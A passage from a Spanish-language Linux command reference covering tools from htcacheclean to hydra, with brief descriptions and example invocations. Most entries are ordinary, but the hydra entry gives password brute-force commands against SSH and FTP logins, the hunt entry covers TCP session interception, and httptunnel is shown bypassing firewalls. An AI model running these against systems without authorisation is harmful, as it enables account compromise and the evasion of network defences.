        %
$ htag ~/.slogans (probar htag y obtener una firma aleatoria)
Nota.- Cada vez que se ejecuta el comando, se selecciona una firma de forma aleatoria.
$ htag -f ~/mis_frases.txt -n 2 (especifica el archivo de firmas cuando no es el por defecto y muestra la segunda firma del archvo)
1.-
Integrar con un cliente de correo, ejemplo con mutt
$ nano ~/.muttrc
Y añadir la línea
        set signature="htag ~/.slogans|"
El "|" al final indica que mutt debe ejecutar el comando htag y usar su salida como firma.


htcacheclean
Se usa para mantener el tamaño del almacenamiento de mod_disk_cache dentro de un cierto límite. Esta herramienta puede ejecutarse manualmente o en modo demonio. Cuando se ejecuta en modo daemon, actua en segundo plano y comprueba los directorios de la caché a intervalos regulares para ver si el contenido de la caché se ha eliminado.
# htcacheclean -v -t -p/var/cache/apache2/mod_cache_disk -l1024M (de forma detallada [v], eliminando directorios vacios [t] del pDIR y con limite lLIMIT)
Alguna opción:
	-r (Limpiar a fondo. Esto supone que el servidor web Apache no se está ejecutando)
        -n (provoca un procesamiento más lento en favor de otros procesos)


htdbm
Se usa para manipular los archivos de formato DBM que se usan para almacenar nombres de usuario y contraseñas para la autenticación básica de usuarios HTTP a través de mod_authn_dbm de apache.
# htdbm -c /etc/apache2/.htdbm pepe (pedira contraseña y con firmación y creará el archivo .htdbm encriptado)
# htdbm /etc/apache2/.htdbm pepe (pide la nueva contraseña y confirmación de "pepe")
# htdbm -x /etc/apache2/.htdbm pepe (suprime al usuario "pepe"))


htdig
Sistema de búsqueda e indexación web completo para un dominio pequeño o una intranet. Incluye las aplicaciones htdb_dump, htdb_load, htdb_stat, htdig, htdig-pdfparser, htdump, htfuzzy, htload, htmerge, htnotify, htpurge, htstat y rundig.
$ htdig -c /etc/htdig/htdig.conf -i -s (especifica el archivo de configuración, borra bases de datos antiguas e imprime estadísticas sobre el proceso de rastreo al finalizar)
$ htdig -c /etc/htdig/my_site.conf -m my_urls.txt (solo indexa las URLs listadas en my_urls.txt, ignorando otras. Cada URL debe estar en una línea separada)
$ htmerge -c /etc/htdig/htdig.conf -v (crea los índices de documentos y las bases de datos de palabras a partir de los archivos generados por htdig)
$ htmerge -c /etc/htdig/htdig.conf -a -w (utiliza archivos de trabajo alternativos y evita que se cree la base de datos de palabras. -d evita que se cree el índice de documentos)
$ htfuzzy -c /etc/htdig/htdig.conf (genera una base de datos de búsqueda difusa [fuzzy search])
$ rundig -c /etc/htdig/htdig.conf (ejecutará htdig y luego htmerge utilizando la configuración especificada)
$ htnotify (se ejecutado periódicamente (por ejemplo, mediante un cron job) para verificar campos y enviar las notificaciones según metainformación de los documentos HTML)
$ htdb_dump -c /etc/htdig/htdig.conf document.db > document_dump.txt (volcará el contenido de la base de datos .db al .txt)
$ htdb_load -c /etc/htdig/htdig.conf document.db < document_dump.txt (cargará los datos de .txt en la base de datos .db)
$ htdb_stat -c /etc/htdig/htdig.conf document.db (mostrará estadísticas detalladas sobre la base de datos .db)
$ htdump -c /etc/htdig/htdig.conf http://www.ejemplo.com/pagina.html (mostrará información indexada para http://www.ejemplo.com/pagina.html, como su título, descripción, enlaces, etc)
$ htdump -c /etc/htdig/htdig.conf (listará todas las URLs que están actualmente en el índice)
$ htpurge -c /etc/htdig/htdig.conf http://www.ejemplo.com/pagina_obsoleta.html (eliminará la página especificada de las bases de datos de búsqueda)
$ htstat -c /etc/htdig/htdig.conf (mostrar un resumen del estado del índice)


html
Lenguaje de marcado predominante en la elaboración de páginas web.
Las etiquetas básicas de HTML de obligada presencia en todo documento son:
	<!DOCTYPE> (define el tipo de documento HTML)
	<html> (Inicio del documento)
	<head>  (Cabecera del documento.  Metadatos que no se muestran en el navegador pero de especial relevancia para indexadores)
	En el interior de la etiqueta <head> podemos encontrar:
	<title>  (Título que aparece en la barra del navegador)
	<meta>  (Metainformación del codumentos: autor, fecha realización, codificación ...)
	<LINK>  (Otros metadatos: referencias a documentos anteriores, glosarios...)
	<body> (Cuerpo del documento que se muestra en el navegador)
	Dentro de la etiqueta <body> podemos encontrar:
	<a>  (Ancla. Crea un enlace a otro documento o parte del mismo)
	<h1>, <h2>,… <h6>  (Establece la medida de los títulos de cabecera. De h1, más grande a h6 más pequeño)
	<div> (División estructural de la página)
	<p>  (Párrafo)
	<br>  (Salto de linea)
	<table> (Inicio de una tabla. La fias se defines con <tr> i las celdas dentro de las filas con <td>)
	<ul> Lista desordenada.Los ítems se definen con <li>)
	<ol> (Lista ordenada. Los ítems se definen con <li>)
	<dl> (Lista de definición. Pueden ser <dt> [termino a definir] y <dd> Definición del termino)
Excepto algunas pocas etiquetas, la mayoría requieren ser cerradas con la misma etiqueta precedida de una barra: <html>....</html>
Nota.- Los permisos de las carpetas que se muestran en localhost [/var/www/html] han de ser 755 y los ficheros 644.


html2ps
Conversor de HTML a PostScript
$ html2ps archivo.html > salida.ps (convierte el archivo "archivo.html" a PostScript y guarda la salida en "salida.ps")
$ html2ps -css -nomargins -landscape archivo.html > salida_con_opciones.ps (incluye estilos CSS, elimina los márgenes y genera el documento en landscape)
$ html2ps http://www.example.com/index.html > salida_web.ps (conversión de una URL web a PostScript)


html2text
Lee documentos HTML en los archivos de entrada y los convierte en texto sin formato.
$ html2text -o salida.txt archivo.html (especificando nombre del archivo de salida)
$ cat entrada.html | html2text -o salida.txt (en forma de tuberia)
$ echo q | htop -C | aha --line-fix | html2text -width 999 | grep -v "F1Help" | grep -v "xml version=" > file.txt (Especificando un ancho distinto de 79 caracteres)


html-xml-utils
Proporciona una serie de utilidades simples para manipular y convertir archivos HTML y XML de varias maneras. La suite consta de las siguientes herramientas: asc2xml (Convertir de UTF -8 a xml), xml2asc (Convertir de xml a UTF-8), hxaddid (agregar IDS a elementos seleccionados), hxcite (reemplazar las referencias bibliográficas por hipervínculos),  hxcite-mkbib (expandir las referencias y crear bibliografía), hxclean (aplicar heuristics para corregir un archivo HTML), hxcopy (copiar un archivo HTML mientras preserva los enlaces relativos), hxcount (contar elementos y atributos en archivos HTML o XML), hxextract (Extraer elementos seleccionados), hxincl (Expandir archivos HTML o XML), hxindex (crear un índice ordenado alfabéticamente), hxmkbib (Crear bibliografía a partir de una plantilla), hxmultitoc (crear una tabla de contenido para un conjunto de archivos HTML), hxname2id (mueva "id =" o "name =" de un elemento a sus padres), hxnormalize (imprimir un archivo HTML), hxnsxml (Convertir la salida de HXXMLN de nuevo a XML normal), hxnum (Encabezados de sección de números en un archivo HTML), hxpipe (Convertir XML a un formato más fácil de analizar con Perl o Awk), hxprintlinks (numnero de links y agregar tabla de URL al final de un archivo HTML), hxprune (eliminar los elementos marcados de un archivo HTML), hxref (Generar referencias cruzadas), hxselect (extraer elementos que coincidan con un selector CSS), hxtoc (insertar una tabla de contenido en un archivo HTML), hxuncdata (reemplazar las secciones de Cdata por otros caracteres), hxunent (Reemplazar carácteres predefinidas HTML a UTF-8), hxunpipe (convertir la salida de la tubería de regreso al formato XML), hxunxmlns (Reemplazar los "nombres globales" por los prefijos del espacio de nombres XML), hxwls (Enlaces de lista en un archivo HTML) y hxxmlns (Reemplazar los prefijos del espacio de nombres XML por "nombres globales")


htmldoc
Herramienta para generar documentación a partir de archivos HTML o Markdown, permitiéndo exportarla a diversos formatos como HTML, PostScript y PDF, con la capacidad de incluir tablas de contenido [índices] automáticas. No soporta: Hojas de estilo en cascada [CSS] de forma completa, cifrado de PDF más allá de RC4 de 128 bits, formularios PDF, tablas HTML complejas [solo HTML 3.2] ni unicode con formato de texto de derecha a izquierda [RTL] o emojis.
$ htmldoc -f mi_documento.pdf mi_archivo.html (convertir archivo HTML a un PDF)
$ htmldoc -f manual.pdf -t pdf chapter1.html chapter2.html introduction.html (convertir varios archivos HTML a un único PDF con tabla de contenido)
$ htmldoc --webpage -f mi_web.pdf http://www.ejemplo.com/pagina_interesante.html (capturar una página web y convertirla a PDF)
$ htmldoc -t html -d salida_html -outfile indice.html *.html (formato de salida como HTML, crea y guarda todos los htmls en el directorio salida_html, especifica el HTML que contendrá el índice de todos los htmls del directorio actual)
$ htmldoc -f informe.pdf --left 2cm --right 2cm --top 2.5cm --bottom 2.5cm --header 'tL' --footer 't.' mi_informe.html
        --left 2cm, --right 2cm, etc. --> Márgenes. Se puedes usar cm [centímetros], in [pulgadas], mm [milímetros] o pt [puntos]).
        --footer 't.' --> Define el contenido del pie de página. t. significa "número de página a la derecha".
        --header 'tL' --> Define el contenido del encabezado.
Nota.- tL significa "título a la izquierda". Se puede usar códigos como t [título], c [capítulo], p [número de página], d [fecha], T [título del documento], etc., y combinarlos con L [izquierda], C [centro], R [derecha]).
$ htmldoc -f documento.ps -t ps mi_documento.html (generar un archivo PostScript)
$ htmldoc -v -f documento.pdf --no-toc --no-title mi_documento.html (no generar índice ni página de título y mostrar información detallada)


htmlmin
Minificador de HTML que elimina espacios, saltos de línea, comentarios y otros caracteres innecesarios de un archivo de texto, generalmente para reducir su tamaño.
$ htmlmin archivo.html > archivo.min.html (minifica el archivo.html y lo guarda)
$ cat archivo.html | htmlmin > salida.html (lo mismo)
$ htmlmin < archivo.html > salida.html (lo mismo)
$ htmlmin --remove-comments --remove-empty-space archivo.html (elimina comentarios HTML y espacios vacíos innecesarios)
Un ejemplo con un archivo HTML:
        <!DOCTYPE html>
        <html>
          <head>
            <title>Mi página</title>
          </head>
          <body>
            <h1>Hola mundo</h1>
          </body>
        </html>
Se puede minificar así:
        <!DOCTYPE html><html><head><title>Mi página</title></head><body><h1>Hola mundo</h1></body></html>


htop
Muestra el consumo de CPU, RAM y SWAP y debajo de estos los diferentes procesos  organizados por defecto de mayor a menor consumo de CPU. Pulsando “u” podremos introducir el usuario a monitorizar y pulsando “k” e introduciendo el PID, mataremos el proceso.
$ htop


htpasswd
Comando con el que definimos usuario y contraseñas para el servidor apache.
$ htpasswd -c /home/USER/public_html/.htpasswd USUARIO (Creando el archivo  .htpasswd en la ruta especificada con los datos de usuario)


htpdate
Herramienta de sincronización horaria que utiliza servidores web HTTP como fuente para ajustar la hora del sistema según el meridiano de Greenwich [Greenwich Mean Time - GMT]. A diferencia de NTP [Network Time Protocol], que requiere puertos específicos y demonios en ejecución, htpdate usa simplemente solicitudes HTTP estándar para obtener la fecha y hora de la cabecera HTTP de los servidores. La precisión de htpdate suele ser de 0,5 segundos.xs
# htpdate www.google.com (Se conecta al servidor www.google.com por HTTP, obtiene la cabecera Date y ajusta la hora del sistema)
# htpdate -s www.google.com www.cloudflare.com www.microsoft.com ((sincroniza con varios servidores suprimiendo la salida. Calcula un promedio para ajustar la hora con mayor precisión)
$ htpdate -d www.google.com (imprime la hora que recibiría, pero no cambia la hora del sistema)
# htpdate -a -s www.google.com (ajusta el reloj cada cierto intervalo, por defecto 600 s = 10 minutos)


httest
Suite para realizar pruebas HTTP personalizadas. herramienta basada en scripts para probar y evaluar comparativamente aplicaciones web, servidores web, servidores proxy y navegadores web. httest puede emular clientes y servidores incluso en el mismo script de prueba. La emulación de servidores es una característica única, muy útil para probar servidores proxy, navegadores web y navegadores y clientes HTTP. Incluye las herramientas htntlm, htproxy y htremote.
$ httest -T "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" (envía una solicitud GET a example.com y muestra la respuesta del servidor)
$ httest -T "GET /secure HTTP/1.1\r\nAuthorization: Basic <base64-encoded-credentials>\r\n\r\n" (solicitud GET autentificada [con credenciales en formato Base64] para acceder a una ruta protegida en el servidor)
Definir una serie de pruebas en un script con la ejecución más estructurada:
$ cat prueba.hts
    cat <<EOF > prueba.hts
    GET / HTTP/1.1
    Host: example.com
    \n
    EOF
    httest prueba.hts
$ htntlm -u USER -p PASSW -d http://example.com/secure (intenta autentificarse usando NTLM con las credenciales proporcionadas para acceder a una URL protegida)
$ htproxy -P http://proxy.example.com:8080 -T "GET http://example.com HTTP/1.1\r\nHost: example.com\r\n\r\n" (envía la solicitud HTTP a través de proxy.example.com en el puerto 8080)
$ htproxy -P http://proxy.example.com:8080 -T "GET http://example.com HTTP/1.1\r\nHost: example.com\r\nProxy-Authorization: Basic <encoded_credentials>\r\n\r\n" (solicitud a través de proxy con autenticación básica)
$ htremote -H remote.example.com -u usuario -p contraseña -s prueba.hts (envía el archivo prueba.hts para que se ejecute en remote.example.com usando autenticación y muestra los resultados)


httpcode
Herramienta que permite consultar el significado de un código de estado HTTP.
$ hc 404
        Status code 404
        Message: Not Found
        Code explanation: Nothing matches the given URI
Códigos HTTP más comunes que se puede consultar:
        200 --> OK - Solicitud exitosa.
        301 --> Moved Permanently - Redirección permanente.
        400 --> Bad Request - Solicitud malformada.
        403 --> Forbidden - Acceso denegado.
        404 --> Not Found - Recurso no encontrado.
        500 --> Internal Server Error - Error del servidor.
        503 --> Service Unavailable - Servicio no disponible.


httpd
Servicio de protocolo de transferencia de apache
$ httpd -l  (visualizar los módulos activos de apache)
$ httpd -L  (Listado de directivas disponibles)
$ httpd -t  (realiza un test de los archivos de configuración [Syntax OK])
$ httpd -h  (muestra las opciones)
$ httpd -v (versión de apache)
$ httpd -V (versión y parámetros compilados)


httpdirfs
Programa que permite montar listados de directorios HTTP como un sistema de archivos virtual a través de la interfaz FUSE. Admite autenticación básica HTTP.
$ httpdirfs http://example.com/files/ /mnt/httpfiles (montar un directorio HTTP en local)
$ httpdirfs -u usuario -p contraseña http://example.com/protected/ /mnt/protected (montará el directorio protegido usando las credenciales proporcionadas)
$ httpdirfs --cache --cache-location=/tmp/httpcache http://example.com/files/ /mnt/httpfiles (habilitar caché local y especificar la ubicación)
$ httpdirfs -o allow_other --no-range-check https://www.example.com/mycrazypath/rocky-linux-8.iso /mnt/iso (permite acceso a otros usuarios, desactiva verificación y montar un solo archivo HTTP)


httperf
Herramienta de benchmarking para medir el rendimiento de servidores web. Permite generar diversas cargas de trabajo simulando múltiples clientes concurrentes y peticiones HTTP para evaluar cómo se comporta el servidor bajo estrés.
$ httperf --hog localhost (prueba básica en la propia páquina)
$ httperf --hog ejemplo.com --num-conns 100 (especifica el número total de conexiones HTTP que se van a establecer)
$ httperf --hog ejemplo.com --rate 10 --num-conns 100 (intentará establecer 10 conexiones por segundo hasta llegar a un total de 100)
$ httperf --hog ejemplo.com --rate 10 --num-conns 100 --timeout 5 (tiempo máximo en segundos que esperará por una respuesta del servidor antes de considerar la petición como un error)
$ httperf --hog ejemplo.com --port 8080 --uri /productos/index.html --num-conns 50 (especifica la ruta del recurso que se va a solicitar en el servidor y el puerto)
$ httperf --hog ejemplo.com --num-conns 100 --hog-conns --num-reqs 10 (abrirá 100 conexiones y realizará 10 peticiones a través de cada una de ellas)
$ httperf --hog localhost --num-conns 1 --print-reply (imprime las respuestas del servidor pero no recomendado para pruebas de gran volumen ya que genera mucho output)
$ httperf --hog ejemplo.com --num-conns 10 --add-header "X-Custom-Header: MyValue" (añadir una cabecera HTTP personalizada)


httpfs2
Herramienta basada en FUSE [Filesystem in Userspace] que permite montar URLs HTTP o HTTPS como si fueran archivos en el sistema de archivos local.
$ httpfs2 https://ejemplo.com/archivo.txt ~/httpfs_mount (montar la URL en un directorio existente)
Acceder al contenido de la URL como si fuera un archivo local (cat, ls, ...)
$ fusermount -u ~/httpfs_mount (desmontar el sistema)


httpie
Es como un "navegador" de consola que permite enviar solicitudes HTTP [GET, POST, PUT, DELETE, etc.] y ver las respuestas de una manera clara y legible.  Es una alternativa moderna y amigable a curl [ver], que a menudo puede ser un poco más complicado de usar para tareas comunes.
$ httpie example.com (mostrará la respuesta HTML de example.com con resaltado de sintaxis)
$ httpie api.github.com/users/octocat (salida JSON con la información del usuario octocat)
$ httpie httpbin.org/get search==httpie q==ejemplo (Esto enviará una solicitud GET con los parámetros especificados. Util para probar solicitudes HTTP)
$ httpie POST httpbin.org/post name=Juan email=juan@example.com (enviará una solicitud POST)
$ httpie -f POST httpbin.org/post username=user123 password=secure_password (enviar datos como un formulario HTML)
$ httpie GET httpbin.org/headers User-Agent:MiApp Custom-Header:ValorPersonalizado (añadir encabezados)
$ httpie -a usuario:contraseña httpbin.org/basic-auth/usuario/contraseña (autenticación básica)
$ httpie POST httpbin.org/post avatar@~/pictures/me.jpg (subir un archivo)
$ httpie -o imagen.png example.com/image.png (descargar un archivo en lugar de mostrar la salida)
$ httpie -v httpbin.org/cookies/set?nombre=valor (ver las cookies enviadas y recibidas)
$ httpie -h example.com (ver solo los encabezados de la respuesta)
$ httpie -b example.com (ver solo el cuerpo de la respuesta)


httping
Ping específico para conexiones HTTP. Envía solicitudes a un nombre de host o una URL remota y muestra cuánto tiempo lleva conectarse, enviar una solicitud HTTP y recuperar la respuesta.
$ httping -g http://www.tuxapuntes.com (forma básica)
$ httping -l -g https://localhost/ (usando una conexiḉon SSL)
$ httping -h localhost -p 80 (ping a localhost usando el puerto 80)
$ httping -g http://localhost/ -U username -P password (usando autentificación)


httpry
es una herramienta diseñada para mostrar y registrar el tráfico HTTP en una red. Su principal función es mostrar y guardar las solicitudes y respuestas HTTP para su posterior análisis.
# httpry -i eth0 (captura el tráfico HTTP en la interfaz de red eth0 y lo muestra en la terminal)
# httpry -i eth0 -o captured_traffic.log (captura el tráfico HTTP en la interfaz de red eth0 y lo guarda en el archivo especificado)
# httpry -r captured_traffic.log (lee y muestra el tráfico HTTP previamente capturado y guardado en el archivo captured_traffic.log)
# httpry -i eth0 -o captured_traffic.log -q (capturar tráfico en modo silencioso)
# httpry -i eth0 | grep "GET" (captura el tráfico HTTP en la interfaz de red eth0 y filtra para mostrar solo las solicitudes GET)


httptunnel
Herramienta que permite crear un túnel bidireccional de datos encapsulado en solicitudes HTTP particularmente útil para usuarios detrás de cortafuegos restrictivos que solo permiten tráfico HTTP, generalmente en los puertos 80 o 443. Si se permite el acceso a la WWW a través de un proxy HTTP, es posible usar httptunnel y, por ejemplo, Telnet o PPP para conectarse a un ordenador fuera del cortafuegos. Cuenta con dos comandos hts [servidor de httptunnel, que escucha conexiones entrantes en un puerto, por defecto 8888 o un puerto permitido como 80 y redirige el tráfico al destino especificado] y htc [cliente de, que establece la conexión al servidor hts y redirige el tráfico local hacia el túnel]. No soporta HTTPS directamente, solo HTTP.
# hts -F localhost:22 80 (redirige el tráfico al puerto SSH local y escucha en el puerto 80. Asegurarse de que no esté ocupado por apache)
# htc -F 12345 myserver.com:80 (inicia el cliente htc para conectar al servidor hts y redirigir el tráfico local al túnel)
Ahora se puede conectar al servidor SSH a través del túnel:
$ ssh localhost -p 12345 (conecta el cliente SSH local al puerto 12345, que htc redirige a myserver.com:80, y hts lo pasa al puerto SSH [22] del servidor)
1.-
Túnel con proxy HTTP
Si estás detrás de un proxy HTTP
# hts -F localhost:22 80 (iniciar hts)
En el cliente iniciar htc especificando el proxy:
$ htc -P proxy.company.com:8080 -F 12345 myserver.com:80
        -P proxy.company.com:8080 --> Especifica el proxy HTTP.
        -F 12345 --> Puerto local para las conexiones.
        myserver.com:80 --> Servidor `hts`.
$ ssh localhost -p 12345 (conexión SSH)
2.-
Túnel con autenticación en el proxy
Si el proxy requiere autenticación [usuario:contraseña]:
En el servidor:
# hts -F localhost:22 80
En el cliente:
$ htc -P proxy.company.com:8080 -A usuario:contraseña -F 12345 myserver.com:80
$ ssh localhost -p 12345 (conexión SSH)
3.-
Túnel para Telnet
Para usar httptunnel con Telnet en lugar de SSH, el proceso es similar. Supongamos que el servidor Telnet está en myserver.com:23.
En el servidor:
# hts -F localhost:23 80
En el cliente:
$ htc -F 12345 myserver.com:80
$ telnet localhost 12345 (conexión Telnet)
htc -F 12345 myserver.com:80 -D5 (habilitar la salida de depuración si el túnel no funciona. Los niveles van de 0 [sin mensajes] a 5 [muy detallado])
Verificar que los puertos estén libres y si no, elegir otros:
# ss -lap | grep ":80" (para el servidor)
# ss -lap | grep ":12345" (para el cliente)
4.-
Configuración como servicio en el servidor para que hts se ejecute automáticamente al iniciar el sistema:
# nano /etc/init.d/httptunnel
        #!/bin/sh
        ### BEGIN INIT INFO
        # Provides: httptunnel
        # Required-Start: $syslog $remote_fs $network
        # Required-Stop: $syslog $remote_fs $network
        # Default-Start: 2 3 4 5
        # Default-Stop: 0 1 6
        # Short-Description: Start httptunnel as daemon
        ### END INIT INFO
        #
        LOGFILE="/var/log/hts_server.log"
        DATE=`date +%d/%m/%Y-%Hh%Mm%Ss`
        #
        case "$1" in
          start)
            echo "$DATE : Starting HTTP-Tunnel Server" >> $LOGFILE
            hts -F localhost:22 10000 &
            ;;
          stop)
            killall hts
            echo "$DATE : Stopping HTTP-Tunnel Server" >> $LOGFILE
            ;;
          restart)
            $0 stop
            $0 start
            ;;
          *)
            echo "Usage: $0 { start | stop | restart }"
            ;;
        esac
        exit 0
# chmod 755 /etc/init.d/httptunnel (hacer el script ejecutable)
# update-rc.d httptunnel defaults (añádirlo al inicio del sistema)


httrack
[WebHTTrack]. Crea en local una copia navegable de una web que puede visualizarse con un navegador sin necesidad de conexión a internet.
$ httrack sitio_escogido.com (Crea en el directorio personal una carpeta "sitio_escogido.com" con todos loa datos descargados del sitio original)
$ httrack sitio_escogido.com -O /root/descargas/pelis (Especificando lugar de descarga)


hub
GitHub facilita el uso de Git con esta herramienta que encapsula Git para extenderlo con funciones adicionales que facilitan su uso de GitHub. Por ejemplo:
$ hub clone rtomayko/tilt (se expande a: git clone git://github.com/rtomayko/tilt.git)
$ nano .bashrc
Entrar la linea:
eval "$(hub alias -s)"
$ source .bashrc (actualizar eñ archivo)
A partir de ahora siempre que se escriba "git ...." se obtendrá todas las funciones de hub


hunspell
Corrector ortográfico y morfológico. Permite modificar, incluir y ver opciones de palabras.
	$ echo 'El pinguino es hun systema mui bonitoo' | hunspell -A -d es_ES (Tradudir una frase. Los asteriscos son palabras correctas)
	@(#) International Ispell Version 3.2.06 (but really Hunspell 1.4.0)
	*
	& pinguino 1 3: pingüino
	*
	& hun 8 15: hin, un, huna, huno, han, aun, huí, huy
	& systema 2 19: sistema, estema
	& mui 12 27: muí, muo, mi, muir, muió, mua, mue, mus, tui, fui, mué, muy
	& bonitoo 4 31: bonito, bonitos, bonito o, boniato
$ hunspell -d es_ES -l archivo.txt (Corregir un texto)
$ hunspell -d es_ES -l archivo.odt (un odt)
$ hunspell -d es_ES -p unrecognized archivo.odt (palabra por palabra)
$ hunspell -i utf-8 archivo.txt (epecificando una codificación)
$ hunspell (entrar  de forma interactiva. Salir con C-c)
$ hunspell -D (mostrar diccionarios disponibles)
$ hunspell -l archivo.odt (imprime palabras mal escritas del fichero especificado)


hunt
Herramienta de red que permite interceptar y manipular conexiones TCP/IP y mostrar información sobre ellas y se utiliza comúnmente en pruebas de penetración [pentest] para evaluar la seguridad de las redes. Incluye las aplicaciones tpserv y transproxy.
$ hunt -i eth0 (interceptará todas las conexiones salientes en la interfaz eth0)
$ hunt -s -i eth0 (mostrará información detallada sobre el tráfico de red que se está supervisando)
$ hunt -L (mostrará una lista de conexiones actuales)
$ hunt -R <número de conexión> (Luego, se puede restablecer la que proceda)
$ transproxy -i eth0 (lanzar un proxy transparente que se ejecuta en el kernel de Linux)
$ tpserv -p 8080 -v (iniciar el proxy en el pñuerto 8080 y mostrar información)
$ tpserv -p 8080 -d 192.168.1.100 -P 80 (redirigirá el tráfico desde el puerto 8080 a la dirección IP 192.168.1.100 en el puerto 80)


hw-probe
herramienta para comprobar la operatividad del hardware de la computadora y cargar el resultado en la base de datos de hardware de Linux.
# hw-probe -all -upload


hwb
Hardware Book contiene información técnica diversa sobre computadoras y otros dispositivos electrónicos. Tambien hay muchos conectores comunes y poco comunes disponibles, así como
información sobre cómo construir cables. Colocar en el navegador file:///usr/share/doc/hwb/html/about/index.html


hwclock
Ver fecha y hora de la BIOS
# hwclock -D (Muestra toda la información))
# hwclock -w (sincroniza la del hardware a la del sistema)
# hwclock -r  (verifica desfase entre ambas)
# hwclock --set --date="2014-04-28 18:00" (establecer cambio de hora en el sistema y en el hardward.
# hwclock --set (establece el RTC [Real Time Clock ] según --date)
# hwclock -a (ajusta la RTC para tener en cuenta la desviación sistemática)
# hwclock -u (la escala de tiempo del RTC es UTC [Universal Time Coordinated])


hwdata
Contiene bases de datos de identificación de hardware utilizadas por diversas herramientas del sistema para reconocer y configurar dispositivos.
Muchas herramientas usan los datos de hwdata para mostrar información:
$ lspci -nn (muestra nombres de dispositivos PCI [usa /usr/share/hwdata/pci.ids])
$ lsusb (muestra nombres de dispositivos USB [usa /usr/share/hwdata/usb.ids])
$ grep "1d6b" /usr/share/hwdata/pci.ids (con la ID de un dispositivo buscarlo en pci.ids)
$ grep "093a" /usr/share/hwdata/usb.ids (con la ID del mouse buscarlo en usb.ids)
Nota.- En sistemas modernos, parte de su función ha sido reemplazada por pciutils, para PCI o usbutils para USB, que pueden descargar bases de datos actualizadas dinámicamente.


hwinfo
Información sobre la máquina más completa que con lshw.
$ hwinfo --disk (Información sobre los discos)
$ hwinfo --short --block (descripción general)
$ hwinfo --disk --only /dev/sdb (información de un disco solamente)
$ hwinfo --short (mostrar un resumen)


hwloc-gather-topology
Guarda los archivos de topología relevantes y la salida hwloc para uso posterior:
$ hwloc-gather-topology --dmi hwloc
	Topology files gathered in ./hwloc-topology.tar.bz2 and kept in /tmp/tmp.Mfv99mIHmB/hwloc/
	Expected topology output stored in ./hwloc.output
	WARNING: Do not post these files on a public list or website unless you
	WARNING: are sure that no information about this platform is sensitive.
El resultado nos advierte: "No publique estos archivos en una lista pública o sitio web a menos que estamos seguros de que ninguna información sobre esta plataforma es confidencial." y del directorio en el que los encontraremos: /tmp/tmp.Mfv99mIHmB/hwloc/


hwloc-nox
[HardWare LOCality]. Utilidades para la vista jerárquica de la máquina que recopilan información sobre el hardware y sus atributos como los nodos de memoria NUMA [Non-Uniform Memory Access], los sockets, las cachés compartidas, los núcleos, el multihilo simultáneo, CPU, dispositivos PCI, información de caché y memoria. Incluye las herramientas hwloc-annotate, hwloc-bind, hwloc-calc, hwloc-compress-dir, hwloc-diff, hwloc-distrib, hwloc-gather-cpuid, hwloc-gather-topology, hwloc-info, hwloc-ls, hwloc-patch, hwloc-ps, lstopo, lstopo-no-graphics y hwloc-dump-hwdata
$ hwloc-info (información detallada de objetos de hardware)
$ hwloc-info Socket:0 (información del primer socket de CPU)
$ hwloc-info package:all
$ hwloc-info -p core:2
$ hwloc-ls (muestra la topología del hardware)
$ hwloc-ls -.ascii (muestra la topolocia en forma ascii)
$ hwloc-ls -p (de forma lógica)
$ hwloc-ls -c (de la cpu)
$ hwloc-ls --whole-system (sin limitaciones de administración)
$ lstopo (parecido a la anterior)
$ hwloc-calc core:0 (calcula máscaras de afinidad)
$ hwloc-bind core:0 who (ejecuta un comando con afinidad a CPUs o memoria específica)
$ hwloc-distrib 4 (distribuye tareas entre los núcleos disponibles)
$ hwloc-gather-topology salida (recolecta la topología del sistema para análisis remoto. crea: salida.output, salida.tar.bz2 y salida.xml)
$ sudo hwloc-gather-cpuid cpuid_output (recolecta información de CPUID y ña guarda en varios archivos en el directorio cpuid_output)
$ hwloc-diff topo1.xml topo2.xml (compara dos topologías)
$ hwloc-compress-dir salida.tar.bz2 salida/ (comprime directorios creados con hwloc-gather-*)
$ hwloc-patch original.xml diff.xml patched.xml (aplica diferencias [diff] entre topologías)
$ hwloc-annotate original.xml anotado.xml pu:0 tipo CustomData valor valor123 (agrega anotaciones a una topología)
$ hwloc-ps -a (muestra procesos y su afinidad CPU/memoria)
$ hwloc-ps -e (informa de los últimos procesadores donde se ejecutó un proceso o subproceso.)
$ hwloc-dump-hwdata /var/run/hwloc/ (vuelca datos del sistema para luego analizarlos con otras herramientas)


hxtools
Colección de herramientas y scripts que se han acumulado a lo largo de los años y cada uno de los cuales parece ser demasiado pequeño para garantizar su propio proyecto. El listado es:
 - bsvplay          - convertir archivos de música BASICA a PCM
 - cctypeinfo       - muestra los tamaños de los tipos C en la implementación con la que se compiló
 - checkbrack       - comprobación de paréntesis y recuento de paréntesis
 - declone          - romper los enlaces duros
 - diff2php         - transformar el parche en un archivo PHP de autoservicio
 - fd0ssh           - tubo para soporte de password-over-stdin a ssh
 - fnt2bdf          - convertir fuentes VGA sin procesar a X11 BDF
 - gpsh             - grep en listas de seguimiento y reproducción de archivos de audio
 - logontime        - muestra el tiempo de conexión acumulado de wtmp
 - mailsplit        - divide una mbox en ficheros individuales
 - mod2opus         - envoltura para el módulo de seguimiento/transcodificación de MIDI a Opus
 - hxnetload        - muestra la utilización de la interfaz de red
 - ofl              - abre el archivo lister (reemplaza el fusor y lsof -m)
 - paddrspacesiz    - tamaño de impresión de los espacios de dirección de los procesos
 - pesubst          - sustitución de la corriente perl-regexp (reemplaza la sed por sub-sustituciones)
 - pmap_dirty       - muestra la cantidad de RAM que un proceso usa con fuerza
 - proc_iomem_count - mostrar los tamaños de las regiones MMIO
 - qplay            - convierte las cadenas de reproducción de QBASIC a PCM
 - qtar             - interfaz más rápida para tar con pedido de archivos
 - Recurssive_lower - todos los nombres de ficheros en minúsculas recursivas
 - sourcefuncsize   - análisis estadístico del código
 - spec-beautifier  - programa para limpiar los archivos RPM .spec
 - stxdb            - Base de datos de archivos A/V
 - su1              - lo que el sudo debería haber hecho
 - utmp_register    - hacer entradas en la base de datos utmp/wtmp
 - vcsaview         - mostrar un volcado de pantalla en formato VCSA
 - vfontas          - Ensamblador de archivos de fuentes VGA
 - wktimer          - temporizador de trabajo


hydra
Se utiliza para crackear los sistemas de login de diferentes servicios como HTTP, FTP, TELNET, IMAP, SMB, SSH, etc.
# hydra 192.168.1.5 -l admin -p 1234 (Una ip con el usuario "admin" con la clave "1234")
# hydra -M lista_ips ssh -s 22 (A un listado de ips a una por linea y sobre el puerto 22)
# hydra 192.168.1.8 ftp -s 21 -l juan -P wordlist.txt (Una ip el puerto 21 del usuario "juan" y probando las contraseñas de un archivo de texto a una por linea)


hyperfine
